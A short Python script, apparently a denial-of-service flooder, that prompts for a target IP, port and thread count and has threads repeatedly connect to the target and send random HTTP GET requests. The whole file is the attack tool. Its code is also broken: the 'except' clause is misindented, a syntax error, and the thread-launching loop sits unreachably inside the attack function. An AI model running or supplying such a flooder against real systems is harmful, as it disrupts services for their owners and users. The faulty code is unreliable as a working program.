#!/usr/bin/python

import socket
import random
import time
import threading

target = str(input("Target Ip: "))
port = int(input("Target Port: "))
thread_num = int(input("Number Of Threads: "))

def attack():
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((target, port))
      s.sendto(("GET /%s HTTP/1.1\r\n" % random.randint(0, 2000)).encode('utf-8'), (target, port))
      print("Request Send to %s:%s " % (target, port))
      s.close()
      except:
        pass
  
  for i in range(thread_num):
    t = threading.Thread(target=attack)
    t.start()
